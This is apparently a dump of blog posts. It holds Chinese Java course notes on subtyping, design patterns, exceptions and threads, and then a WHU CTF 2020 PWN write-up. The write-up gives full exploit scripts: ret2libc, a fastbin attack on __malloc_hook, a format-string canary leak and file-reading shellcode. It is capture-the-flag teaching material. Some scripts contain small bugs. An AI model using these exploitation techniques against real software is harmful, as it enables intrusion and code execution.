子类中可以增加自己特有的方法。 当子类的方法重载父类的方法时，方法的前置条件（即方法的形参）要比父类方法的输入参数更宽松。 当子类的方法实现父类的抽象方法时，方法的后置条件（即方法的返回值）要比父类更严格。 注意正方形不是长方形的子类型的原因在于： 如果设定一个resize方法提供给用户改变长、宽的功能，那么这个函数对于正方形来说一定要求长与宽相等，而对于正方形的父类长方形来说并没有这个要求，导致子类型方法的前置条件更强，违反了LSP。但如果没有这些需求，正方形可以作为长方形的子类 同理：长度大于1的所有正方形也不是正方形的子类型！ 下图才是一个标准的子类型，可以看到子类型应该可以完全替换父类型。 那么长方形是不是正方形的子类型呢？ 显然也不是的，长方形（子类）的不变量比长方形（父类）弱。 协变、逆变（反协变） 协变：类型更具体 逆变：类型更抽象 不厌其烦再强调一遍LSP，从父类型到子类型： 方法参数：逆变 方法的返回值：协变 异常类型：协变 协变 逆变 需要注意Java并不能提供逆变，它会把上右图当作重载处理，所以在Java中应当忽略子类型的逆变要求。 同时注意上左图，Java不会当作重载处理 数组的子类型化 // numbers是引用，类型为Number[] Number[] numbers = new Number[2]; numbers[0] = new Integer(10); numbers[1] = new Double(3.14); //不会报错 // myNumber是对象，与myInts类型相同，在运行时Java知道myNumber实际上是Integer[] Integer[] myInts = {1,2,3,4}; Number[] myNumber = myInts; myNumber[0] = 3.14; //run-time error! 区分：对象的类型 vs. 引用的类型 泛型的子类型化与通配符 ArrayList\u003cString\u003e 是List\u003cString\u003e 的子类型 List\u003cString\u003e 不是 List\u003cObject\u003e 的子类型 List\u003cNumber\u003e是 List\u003c?\u003e的子类型 List\u003cNumber\u003e是List\u003c? extends Object\u003e的子类型 List\u003cObject\u003e是List\u003c? super String\u003e 的子类型 List\u003cInteger\u003e myInts = new ArrayList\u003cInteger\u003e(); myInts.add(1); myInts.add(2); List\u003cNumber\u003e myNums = myInts; //compiler error！ myNums.add(3.14); 泛型的具体化不是协变，Java运行时会对泛型做类型擦除处理，如下图 源代码 运行时 委托机制 委派/委托：一个对象请求另一个对象的功能 一个类不需要继承另一个类的全部方法，通过委托机制调用部分方法，从而避免大量无用的方法；反之则用继承 “委托”发生在object层面，而“继承”发生在class层面 更多见实验，略。 Comparator/Comparable 方法一：自己实现 if-else实现 lambda表达式 方法二：实现Comparator接口并override compare()函数 public class EdgeComparator implements Comparator\u003cEdge\u003e{ @Override public int compare(Edge o1, Edge o2) { if(o1.getWeight() \u003e o2.getWeight()) return 1; else if (.. == ..) return 0; else return -1; } } // 实现后需要新建一个Comparator public void sort(List\u003cEdge\u003e edges) { Comparator comparator = new EdgeComparator(); Collections.sort(edges, comparator); } 方法三：实现Comparable接口并override compareTo() 方法 public class Edge implements Comparable\u003cEdge\u003e { Vertex s, t; double weight; ... public int compareTo(Edge o) { if(this.getWeight() \u003e o.getWeight()) return 1; else if (.. == ..) return 0; else return -1; } } // 不需要构建新的Comparator类，比较代码放在ADT内部 public void sort(List\u003cEdge\u003e edges) { Collections.sort(edges); } CRP Composite/Aggregate Reuse Principle(CARP)：尽量使用合成/聚合达到复用，尽量少用继承 临时性的委托 合成的委托 聚合的委托 几种经典的面向复用的设计模式 Structural patterns 结构型模式： Adaptor、Decorator、Facade Behavioral patterns 行为类模式 ：Strategy、Template method、Iterator Adaptor模式 适配器模式：将某个类/接口转换为client期望的其他形式 实现方式：通过增加一个接口，将已存在的子类封装起来， client面向接口编程，从而隐藏了具体子类 class LegacyRectangle { void display(int x1, int y1, int w, int h) {... } } // 接口不匹配 class Client { public display() { new LegacyRectangle().display(x1, y1, x2, y2); } } 添加Adaptor类Rectangle实现抽象接口，并完成适配 interface Shape { void display(int x1, int y1, int x2, int y2); } // Adaptor class Rectangle implements Shape { void display(int x1, int y1, int x2, int y2) { new LegacyRectangle().display(x1, y1, x2-x1, y2-y1); } } class LegacyRectangle { void display(int x1, int y1, int w, int h) {...} } class Client { // 适配 Shape shape = new Rectangle(); public display() { shape.display(x1, y1, x2, y2); } } Decorator模式 装饰器模式：为对象增加不同侧面的特性 实现方式：对每一个特性构造子类，通过委派机制增加到对象上 // 包装stack得到Decorator基本类 public abstract class StackDecorator implements Stack { protected final Stack stack; public StackDecorator(Stack stack) { this.stack = stack; } public void push(Item e) { stack.push(e); } public Item pop() { return stack.pop(); } ... } // 对其进行包装 public class UndoStack extends StackDecorator implements Stack { private final UndoLog log = new UndoLog(); public UndoStack(Stack stack) { super(stack); } public void push(Item e) { log.append(UndoLog.PUSH, e); //新特性 super.push(e); } public void undo() { //implement decor","date":"2020-06-08","objectID":"/2020/06/software-engineering/:3:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 5 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:4:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target 可维护性的常见度量指标 聚合度与耦合度 SOLID 设计模式： factory method、abstract factory、 proxy、observer/observable、 visitor、statememento 语法、正则表达式 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:4:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context 可维护性的常见度量指标 圈复杂度CC = E-N+2 E表示控制流图中边的数量，N表示控制流图中节点的数量 Halstead Volume，略 可维护性指数越高可维护性越好，公式略 继承的层次数 、类之间的耦合度 、单元测试的覆盖度 聚合度与耦合度 耦合是两模块间独立性的量度，越低越独立 内聚是一个模块内方法或责任的相关性的亮度，越高越相关 模块化编程应当高内聚、低耦合 面向对象编程原则：SOLID (SRP) The Single Responsibility Principle 单一责任原则：一个类，一个责任 // 两个责任：Connection Management 、Data Communication interface Modem { public void dial(String pno); public void hangup(); public void send(char c); public char recv(); } // 应该分开 interface DataChannel { public void send(char c); public char recv(); } interface Connection { public void dial(String phn); public char hangup(); } (OCP) The Open-Closed Principle 开放-封闭原则：模块行为是可扩展的，修改的时候不要修改原有的代码 比如有多种不同类型的Server，那么每出现一种新的Server，就需要修改Server内部代码；而如果使用抽象的Server类做父类，其中包含公共部分，而将特殊部分交给子类实现便可以实现OCP； public void drawShape(Shape s) { if (s.m_type==1) // if-else将导致扩展新行为时改变原有代码 drawRectangle(s); else if (s.m_type==2) drawCircle(s); } public void drawCircle(Circle r) {....} public void drawRectangle(Rectangle r) {....} } class Shape { int m_type; } class Rectangle extends Shape { Rectangle() { super.m_type=1; } } class Circle extends Shape { Circle() { super.m_type=2; } } // 将不同功能封装到不同形状中可以实现OCP class GraphicEditor { public void drawShape(Shape s) { s.draw(); } } class Shape { abstract void draw(); } class Rectangle extends Shape { public void draw() { // draw the rectangle } } (LSP) The Liskov Substitution Principle Liskov替换原则：略 (DIP) The Dependency Inversion Principle 依赖转置原则：只对接口编程，依赖于抽象而不依赖于具体。 依赖倒置原则在java中表现就是，模块间依赖通过抽象发生，实现类之间不发生直接依赖关系，其依赖关系是通过接口或者抽象类产生的。如果类与类直接依赖细节，那么就会直接耦合。如此一来当修改时，就会同时修改依赖者代码，这样限制了可拓展性。 //文学经典类 public class LiteraryClassic{ //阅读文学经典 public void read(){ System.out.println(\"文学经典阅读，滋润自己的内心心灵\"); } } //小明类 public class XiaoMing{ //阅读文学经典 public void read(LiteraryClassic literaryClassic){ literaryClassic.read(); } } // 场景 public class Client{ public static void main(Strings[] args){ XiaoMing xiaoming = new XiaoMing(); LiteraryClassic literaryClassic = new LiteraryClassic(); //小明阅读文学经典 xiaoming.read(literaryClassic); } } //但小明想看小说时，发现中委托实现依赖LiteraryClassic具体类 //小说类 public class Novel{ //阅读小说 public void read(){ System.out.println(\"阅读小说，放松自己\"); } } //正确的做法应该是创建小说与文学经典的父类Book，小明委托Book中的read (ISP) The Interface Segregation Principle 接口聚合原则 ：使用多个隔离的接口，比使用单个“胖”接口要好 几种经典的面向可维护性的设计模式 Creational patterns ： Factory method、Abstract factory Structural patterns ：proxy Behavioral patterns ：observer、visitor 基于状态的构造模式：Memento、state Factory Method pattern 工厂方法：定义一个用于创建对象的接口，让其子类来决定实例化哪一个类 // 产品接口 public interface Trace { // turn on and off debugging public void setDebug( boolean debug ); // write out a debug message public void debug( String message ); // write out an error message public void error( String message ); } // 具体实现类1 public class FileTrace implements Trace { ... } // 具体实现类2 public class SystemTrace implements Trace { ... } // Client使用只能绑定到具体的类 Trace log = new SystemTrace(); log.debug( \"entering log\" ); Trace log2 = new FileTrace(); log.debug(“...”); // 如果使用工厂方法 interface TraceFactory { public Trace getTrace(); public Trace getTrace(String type); void otherOperation(){}; } public class Factory implements TraceFactory { public Trace getTrace() { return new SystemTrace(); } public getTrace(String type) { if(type.equals(“file”) return new FileTrace(); else if (type.equals(“system”) return new SystemTrace(); } } // 客户端无需绑定到具体类 Trace log1 = new Factory1().getTrace(); log1.setDebug(true); log1.debug( \"entering log\" ); Trace log2 = new Factory2().getTrace(\"system\"); log2.setDebug(false); log2.debug(\"...\"); 静态工厂方法略 抽象工厂方法：可以看到上述Factory中的if-else可能违反了开闭原则，所以通过定义抽象工厂父类，每个子类工厂实现某个具体产品类的创建，这便是抽象工厂方法。同时如果有多个顺序确定的产品需要创建，可利用工厂辅助类确定顺序 // 抽象工厂 public interface AbstractWidgetFactory{ public Window createWindow(); public Scrollbar createScrollbar(); } // 具体工厂1 public class WidgetFactory1 implements AbstractWidgetFactory{ public Window createWindow(){ ... } public Scrollbar createScrollbar(){...} } // 具体工厂2 public class WidgetFactory2 implements AbstractWidgetFactory{ public Window createWin","date":"2020-06-08","objectID":"/2020/06/software-engineering/:4:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 6 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:5:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target 健壮性和正确性 Throwable Error/Runtime异常、其他异常 Checked异常、 Unchecked异常 Checked异常的处理机制： – 声明、抛出、捕获、处理、清理现场、释放资源等 自定义异常类 断言的作用、 应用场合 调试的基本过程和方法 黑盒测试用例的设计 – 等价类划分、边界值分析 以注释的形式撰写测试策略 JUnit测试用例写法 测试覆盖度 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:5:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context 健壮性与正确性 健壮性：系统在不正常输入或不正常外部环境下仍能够表现正常的程度 正确性：程序按照spec加以执行的能力，是最重要的质量指标！ 对外的接口，倾向于健壮；对内的实现，倾向于正确 Throwable Error/Runtime异常、其他异常 如上图所示 Error类描述的是内部系统错误，很少发生，开发者也无需操心 RuntimeException类是由程序员在代码里处理不当造成的，是开发者的锅，也是开发者可以改正的 其他异常不是开发者代码问题，而是由外部原因造成，需要捕获、处理 比如数组越界异常，明明知道了是数组越界，说明是开发者自己代码写的有问题，当然应该修改代码，如果放任不管并捕获这个异常不是掩耳盗铃吗；而对于IO异常，开发者并不知道是因为什么，很可能是用户的错误输入，但开发者也没法保证这些异常一定不会出现，所以应该捕获并处理这个异常。 checked异常、unchecked异常 unchecked异常=Runtime异常（程序源代码中引入的故障所造成的）+ Error checked异常=非运行时异常，是程序员无法完全控制的外在问题所导致的，编译器可帮助检查你的程序是否已抛出或处理了可能的异常 分类也不是绝对的，uncheck和check的区分就在于是否是程序员的错误还是外部带来的 checked异常的处理操作 try、catch、finally、throws、throw throws用于方法声明，注意要写进spec中，代表此方法只抛出而不处理某个异常，而是把它交给调用者处理； 在try中throw异常，会直接跳到catch代码块；可以一个try多个catch，也可以没有catch只有finally；也可以在catch中rethrow异常 try { access the database... } catch (SQLException e) { // rethrow throw new ServletException(\"database error: \" + e.getMessage()); } finally代码块不管try中是否throw异常都会执行，甚至在return后也会执行 try{ ... return true; }finally{ ... //不管怎么样都会执行到finally，都会返回false return false; } int a=1; try{ ... return true; }finally{ ... //不管怎么样都会执行到finally，方法返回true，但是a会变为2 a=2; } try-with-resource相当于finally中把resource关掉 try (Scanner in = new Scanner(new FileInputStream(\"/dict/words\")),\"UTF-8\") { while (in.hasNext()) System.out.println(in.next()); }catch(){ ... }//结束后会自动调用in.close() 自定义异常类 通过继承Exception类或其子类来自定义异常 public class FooException extends Exception { public FooException() { super(); } public FooException(String message) { super(message); } public FooException(String message, Throwable cause) { super(message, cause); } public FooException(Throwable cause) { super(cause); } } 断言的作用、 应用场合 断言：在开发阶段的代码中嵌入，检验某些“假设”是否成立。若成立，表明程序运行正常，否则表明存在错误 注意断言机制在产品中一般会被关闭，所以断言只是开发者在开发阶段用来调试内部bug的 换句话说，断言即是对代码中程序员所做假设的文档化，也不会影响运行时性能。一般用于检测内部不变性、表示不变性、方法的前置条件、后置条件等。 //两种格式 assert (something_should_be_true); assert (something_should_be_true):\"print something you want\" 在开发阶段，使用异常来处理“预料到可以发生”的不正常情况；使用断言处理“绝不应该发生”的情况；如果参数来自于外部（不受自己控制），使用异常处理；如果来自于自己所写的其他代码，可以使用断言来帮助发现错误 调试的基本过程和方法 略（貌似都是废话？ 测试 按层次：单元测试 、集成测试 、系统测试 按动作：静态测试（用眼睛摁看） 、动态测试（用测试用例跑程序） 测试：发现是否存在错误 ；调试：识别错误根源，消除错误 测试优先的编程 ：先写spec，再写符合spec的测试用例，最后写代码、执行测试、有问题再改、直到通过测试用例 JUNIT单元测试相关内容 略，见实验 黑盒测试及用例设计 黑盒测试：用于检查代码的功能，不关心内部实现细节 利用等价类划分来设计测试用例，对方法的每个参数逐个考虑等价类 /** * Reverses the end of a string. * * 012345 012345 * For example: reverseEnd(\"Hello, world\", 5) returns \"Hellodlrow ,\" * \u003c-----\u003e \u003c-----\u003e * * With start == 0, reverses the entire text. * With start == text.length(), reverses nothing. * * @param text non-null String that will have its end reversed * @param start the index at which the remainder of the input is reversed, * requires 0 \u003c= start \u003c= text.length() * @return input text with the substring from start to the end of the string * reversed */ public static String reverseEnd(String text, int start) //等价类划分 //对于start参数：start = 0, 0 \u003c start \u003c text.length(), start = text.length() //对于text参数：text.length() = 0; text.length()-start is odd; text.length()-start is even 边界值分析是对等价类划分方法的补充 max(int a,int b) : int × int → int //等价类划分 // a,b间的关系：a\u003eb;a\u003cb;a==b // a的值：a\u003c0;a=0;a\u003e0;a是最小整数、a是最大整数 // b的值：b\u003c0;b=0;b\u003e0;b是最小整数、b是最大整数 // 笛卡尔积测试：3*5*5个测试用例 // 非笛卡尔积测试：3+5+5个测试用例以内 测试用例的编写分为笛卡尔积（全覆盖），覆盖每个取值（每个维度的每个取值至少被1个测试用例覆盖一次） 不在规约范围内的数据不需要测试。但注意，在测试Exception的时候可能会故意输入错误数据，这也是测试的一部分。这也并不矛盾，毕竟异常本就是规约的一部分。 白盒测试 白盒测试：根据程序执行路径设计测试用例 ，是穷举路径的测试。 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:5:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 7 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:6:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target 进程和线程 线程的创建和启动， runnable 内存共享模式、消息传递模式 时间分片、交错执行、竞争条件 线程的休眠、中断 线程安全threadsafe的四种策略 – Confinement、 Immutability、 ThreadSafe类型 – Synchronization/Lock 死锁 以注释的形式撰写线程安全策略 (ThreadSafe Argument) ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:6:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context 进程与线程 进程(Process)：粒度大，私有空间，彼此隔离 ，拥有整台计算机的资源，用fork创建新进程 线程(Thread)：粒度小，是程序内部的控制机制，多个线程共用一块内存 进程=虚拟机；线程=虚拟CPU 多进程之间不共享内存 ，只能通过消息传递进行协作 多线程之间会自动共享内存 ，也可以创建消息队列在线程之间进行消息传递 并行编程的两大模板 内存共享模式：在内存中读写共享数据 两个处理器，共享内存 ;同一台机器上的两个程序，共享文件系统 ;同一个Java程序内的两个线程，共享Java对象 消息传递模式：通过channel交换消息 网络上的两台计算机，通过网络连接通讯 ;浏览器和Web服务器， A请求页面， B发送页面数据给A;即时通讯软件的客户端和服务器;同一台计算机上的两个程序，通过管道连接进行通讯 Shared memory Message passing 线程的创建和启动， runnable 方法一：继承Thread类，重写Thread.run()即可开启新进程 public class HelloThread extends Thread { // 只需重写run方法 public void run() { System.out.println(\"Hello from a thread!\"); } //启动该线程的两个方式 public static void main(String args[]) { HelloThread p = new HelloThread(); p.start(); } public static void main(String args[]) { (new HelloThread()).start(); } } 方法二：实现Runnable.run()，注意Runnable类启动线程的方式 public class HelloRunnable implements Runnable { public void run() { System.out.println(\"Hello from a thread!\"); } public static void main(String args[]) { // 启动线程 (new Thread(new HelloRunnable())).start(); } } // 也可简写 new Thread(new Runnable() { public void run() { System.out.println(\"Hello\"); } }).start(); 注意上述代码，写的是Runnable.run()，调用的是Thread.start()。也很容易理解，如果直接调用Thread.run()它只会打印，可以看出start()中包含了启动线程的所有底层操作，其中也会调用run()来执行用户操作 时间分片、交错执行、竞争条件 虽然有多线程，但只有一个核，每个时刻只能执行一个线程；即使是多核CPU，进程/线程的数目也往往大于核的数目；通过时间分片，在多个进程/线程之间共享处理器，它是由OS自动调度的。下图为两核三线程的例子，可以看到多个线程是交错执行的。 条件竞争的产生原因：单行、单条语句都未必是原子的 （是否原子，由JVM确定 ） private static int x = 1; public static void methodA() { x *= 2; x *= 3; } public static void methodB() { x *= 5; } // x *= 2的原子操作为： // 1.取出x放入寄存器 // 2.寄存器值*2 // 3.将寄存器的值写回x // // 并行运行A、B，最终x可能为5，6，10，30 // 5：B取出x=1 ---\u003e A方法执行结束 ---\u003e B寄存器值*5 ---\u003e 写回x=5 // 6: A执行x*=2后x=2 ---\u003e A取出x=2 ---\u003e B方法执行结束 ---\u003e A寄存器值*3 ---\u003e 写回x=6 // 10: A执行x*=2后x=2 ---\u003e B取出X=2 ---\u003e A方法执行x*=3 ---\u003e B寄存器值*5 ---\u003e 写回x=10 // 30: 顺序执行即可 由于发送者在等待接受消息时并没有停止工作，所以消息传递机制也无法解决竞争条件问题 很常见的问题就是Iterator，不能在用Iterator遍历的时候调用remove() 线程的休眠、中断 Thread.sleep(time) 调用方法的进程休眠time毫秒 t.interrupt() 调用方法的进程向t进程发送中断信号 t.isInterrupted() 检查t是否收到中断信号(中断位是否置上) Thread.interrupted() 检测调用方法的进程中断位是否置上，并会将中断位清零 但进程接收到中断信号并不会立即中断。正常运行期间，即使接收到中断信号，也不理会 ！ class Task implements Runnable{ private double d = 0.0; public void run() { try{ while (true) { // 正常运行时就算接收到中断信号也不理会，继续执行 for (int i = 0; i \u003c 900000; i++) d = d + (Math.PI + Math.E) / d; // 直到sleep()时才会检测是否收到中断信号，如果收到则自动抛出中断异常 Thread.sleep(500); // 或者直接用Thread.interrupted或者isInterrupted检测 //if (Thread.interrupted()) { // throw new InterruptedException(); //} } //进入异常处理执行return后，线程才真正终止 } catch(InterruptedException e) {return;} } } Thread t = new Thread(new Task()); t.start(); Thread.sleep(100); //当前线程休眠 t.interrupt(); //试图中断t线程 需要注意的是，interrupt本身不会直接结束线程，它只是发个信号，在待中断线程中使用sleep或isInterrupted() 接受这个信号并抛出异常，并在异常处理中return才会结束这个进程 t.join() 调用方法的进程暂停，直到进程t执行结束 public class JoinExample2 { // 三个进程操作之间的执行次序并不确定 public static void main(String[] args) { Thread th1 = new Thread(new MyClass2(), \"th1\"); Thread th2 = new Thread(new MyClass2(), \"th2\"); Thread th3 = new Thread(new MyClass2(), \"th3\"); th1.start(); th2.start(); th3.start(); } } // 三个进程操作执行次序确定，th1所有操作顺序执行结束 --\u003e th2... --\u003e th3... public class JoinExample { public static void main(String[] args) { Thread th1 = new Thread(new MyClass(), \"th1\"); Thread th2 = new Thread(new MyClass(), \"th2\"); Thread th3 = new Thread(new MyClass(), \"th3\"); th1.start(); try { // main进程不会继续执行，直到th1执行结束 // join过程中也会接受中断信号并自动抛出异常 th1.join(); } catch (InterruptedException ie) {} th2.start(); try { th2.join(); } catch (InterruptedException ie) {} th3.start(); try { th3.join(); } catch (InterruptedException ie) {} } } 线程安全threadsafe的四种策略 Confinement、 Immutability、 ThreadSafe类型、Synchronization/Lock Confinement Confinement：限制数据共享 核心思想：线程之间不共享mutable数据类型、避免全局变量 将可变数据限制在单一线程内部，避免竞争，不允许任何其他线程直接读写该数据 除非知道线程访问的所有数据，否则Confinement无法彻底保证线程安全 Immutability Immutability ：共享数据为不可变类型、或是只能读不能写 鸡肋 Using Threadsafe Types Data 如果必须要用mutable的数据类型在多线程之间共享数据，要使用线程安全的数据类型。 一般来说，JDK同时提供两个相同功能的类，一个是threadsafe，另一个不是。原因： threadsafe的类一般性能上受影响 比如集合类都是线程不安全的。Java API提供了进一步的decorator。对它们的每","date":"2020-06-08","objectID":"/2020/06/software-engineering/:6:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["PWN"],"content":"赛场http://iwhu.info/ 武大萌新赛（whu的萌新已经强大到这种地步了嘛 虽然题目大部分还算基础，但还是有很多新姿势的。 ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:0:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"pwnpwnpwn 常规的ret2libc，给了lib版本 from pwn import * context.log_level = 'debug' # io = process(\"./pwn\") io = remote(\"218.197.154.9\" ,10004) elf = ELF(\"./pwn\") libc = ELF(\"./libc-2.23.so\") payload = 0x88*'a'+p32(0x804A020+0x500) + p32(elf.plt['write']) + p32(0x804843B) payload += p32(1)+ p32(elf.got['write']) io.sendlineafter(\"Ready?\\n\",payload) write_addr = u32(io.recv(4)) libc_base = write_addr - libc.sym['write'] print hex(libc_base) sys_addr = libc_base + libc.sym['system'] bin_sh = libc_base + libc.search(\"/bin/sh\").next() payload = 0x8c*'a'+p32(sys_addr) + 'a'*4 + p32(bin_sh) io.sendlineafter(\"Ready?\\n\",payload) io.interactive() WHUCTF{welc0me_t0_pwn_woRld} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:1:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"FFF delete功能里明显可以uaf。不让改got，保护全开，估计得改malloc_hook 通过unsorted bin 泄露lib，然后fastbin 打到malloc_hook即可，数据错位得到0x7f ，请求0x60 即可 #coding:utf-8 from pwn import * # import pwn_framework as pf from time import sleep import sys global io ru = lambda p, x : p.recvuntil(x) sn = lambda p, x : p.send(x) rl = lambda p : p.recvline() sl = lambda p, x : p.sendline(x) rv = lambda p, x : p.recv(numb = x) sa = lambda p, a,b : p.sendafter(a,b) sla = lambda p, a,b : p.sendlineafter(a,b) rr = lambda p, t : p.recvrepeat(t) # amd64 or x86 context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] filename = \"./pwn\" ip = \"218.197.154.9\" port = 10007 LOCAL = True if len(sys.argv)==1 else False global bps # Break Points global gds # Gdb Debug Symbols bps = [] gds = {} elf = ELF(filename) remote_libc = \"./libc-2.23.so\" if LOCAL: io = process(filename) # io = process(filename,aslr=False) libc = elf.libc # # if LD_PRELOAD multiple libs, split with ':' # io = process(filename, env={'LD_PRELOAD': remote_libc}) #libc = ELF(remote_libc) else: context.log_level = 'debug' io = remote(ip, port) # libc = elf.libc libc = ELF(remote_libc) def mydebug(p, s=''): def _get_bstr(): global bps b_str =\"\" for break_point in bps: if type(break_point) == int: b_str += \"b *%s\\n\"%(hex(break_point)) elif type(break_point) == str: b_str += \"b %s\\n\"%(break_point) else: pause(p, \"[_get_bstr] unsupported break point type : \"+str(break_point)) return b_str def _get_gds_str(): global gds res = \"\" for name in gds: val = gds[name] if type(name) != str: pause(p, \"[_get_gds_str] unsupported name type : \"+str(type(name))) if type(val) != int: pause(p, \"[_get_gds_str] unsupported val type : \"+str(type(val))) res += \"set $%s=%d\\n\"%(name, gds[name]) return res if not LOCAL: return gdb.attach(p, _get_bstr()+_get_gds_str()+s) def pause(p, s = 'pause'): if LOCAL: print('pid: ' + str(p.pid)) return raw_input(s) else: return raw_input(s) def choice(p, idx): sla(p, XXX, str(idx)) def lg(name, val): log.info(name+\" : \"+hex(val)) def add(size): sla(io,\"\u003e \",\"1\") sla(io,'size?',str(size)) def edit(idx,size,con): sla(io,\"\u003e \",\"2\") sla(io,'index?',str(idx)) sla(io,'size?',str(size)) sn(io,con) def show(idx): sla(io,\"\u003e \",\"3\") sla(io,'index?\\n',str(idx)) def free(idx): sla(io,\"\u003e \",\"4\") sla(io,'index?',str(idx)) pause(io) add(0x100)#0 add(0x60)#1 free(0) show(0) malloc_hook = u64(rv(io,6)+\"\\x00\"+'\\x00') - 0x68 lg(\"malloc_hook:\",malloc_hook) lg(\"libc:\",libc_base) gadget = 0x4526a + libc_base # 0x45216 execve(\"/bin/sh\", rsp+0x30, environ) # constraints: # rax == NULL # 0x4526a execve(\"/bin/sh\", rsp+0x30, environ) # constraints: # [rsp+0x30] == NULL # 0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ) # constraints: # [rsp+0x50] == NULL # 0xf1147 execve(\"/bin/sh\", rsp+0x70, environ) # constraints: # [rsp+0x70] == NULL target_chunk = libc_base + 0x155555328b05 - 0x155554f64000 - 0x18 print(hex(target_chunk)) add(0x20)#2 free(1) edit(1,0x60,p64(target_chunk)) add(0x60)#3 add(0x60)#4 payload = 'a'*(malloc_hook-target_chunk-0x10) + p64(gadget) edit(4,len(payload),payload) add(0x8) io.interactive() WHUCTF{FFFFFFFFFFFFFFastbin_Attack_5e58440652e52e354ae12af8775bec97} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:2:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"arbitrary f1() 输入一个地址实现任意地址写入八字节数，f2()有金丝雀的栈溢出。 f3() 格式化字符串漏洞，_printf_chk 会过滤掉$，得手动调了 输入多个%p 找到位置，进而泄露libc ，还意外的泄露了canary 这题被官网write up误导了，read不会产生\\x00输入截断，直接输入金丝雀就行。本地不知道为什么没打通，不过这题也没啥营养了。 from pwn import * context.log_level='debug' r=process('./pwn',aslr = False) context(arch = 'amd64', os = 'linux', endian = 'little') libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") gdb.attach(r,\"b *0x555555554B80\") # C01 def f2(buf): r.sendlineafter(\"choice\u003e\u003e\",'2') r.sendlineafter(\"input data:\\n\",'a'*8) r.sendlineafter(\"input data:\\n\",buf) def f3(string): r.sendlineafter(\"choice\u003e\u003e\",'3') r.sendlineafter(\"input data:\\n\",string) f3(\".%p\"*10+\".\") # 6-ca7 -\u003e elf_base 10-240 __libc_start_main 8 -\u003e canary for i in range(6): r.recvuntil(\".\") elf_base = int(r.recvuntil(\".\",drop=True),16) - 0xca7 r.recvuntil(\".\") canary = int(r.recvuntil(\"0a.\",drop=True)+'00',16) r.recvuntil(\".\") __libc_start_main = int(r.recvuntil(\".\",drop=True),16) - 240 libc_base = __libc_start_main - libc.sym['__libc_start_main'] success(\"elf_base:\"+hex(elf_base)) success(\"libc_base\"+hex(libc_base)) success(\"canary:\"+hex(canary)) f2(\"b\"*0x38+p64(canary)+p64(0x202520+elf_base)+p64(0xC08+elf_base)) f3(asm(shellcraft.sh())) f2(\"b\"*0x38+p64(canary)+p64(0x202020+elf_base)+p64(0x202060+elf_base)) # 0x202060+elf_base r.interactive() WHUCTF{Do_yOu_kNow_canary} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:3:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"shellcode 沙盒逃逸（？）的orw ，这里参考了一下民间答案,用到getdents 扫描服务器文件夹，找到flag位置。不能直接用sh貌似是因为mprotect （？） int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count); // 从文件描述符fd中读取长度为count的内容到dirp所指的区域 第一阶段扫描整个目录，先open 得到的fd会存放在rax中，然后getdents扫描存放在rsp 中，然后write 出来 shellcode = shellcraft.open(\"./\",0x10000) shellcode += shellcraft.getdents(\"rax\",\"rsp\",0x300) shellcode += shellcraft.write(1,\"rsp\",0x300) 可以看到结果可以勉强辨认，与当前文件夹内容相同（本地测试） 拿到服务器上跑，可以发现有个FFFFFFFFFlag文件夹，进一步解析这个文件夹发现flag在里面，打印出来即可 payload = shellcraft.open(\"./FFFFFFFFFlag/flag\",0) payload += shellcraft.read(\"rax\",\"rsp\",0x300) payload += shellcraft.write(1,\"rsp\",0x300) 可以看到read 只能读取文件，而getdents 能读取文件夹 WHUCTF{ORWOWRROWRWOWORWRO_779243c8c5097c6920d52b79d31f0d4a} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:4:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"attention uaf+fastbin attack打got表，构造chunk size即可，比较简单。 #coding:utf-8 from pwn import * # import pwn_framework as pf from time import sleep import sys global io ru = lambda p, x : p.recvuntil(x) sn = lambda p, x : p.send(x) rl = lambda p : p.recvline() sl = lambda p, x : p.sendline(x) rv = lambda p, x : p.recv(numb = x) sa = lambda p, a,b : p.sendafter(a,b) sla = lambda p, a,b : p.sendlineafter(a,b) rr = lambda p, t : p.recvrepeat(t) # amd64 or x86 context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] filename = \"./pwn\" ip = \"218.197.154.9\" port 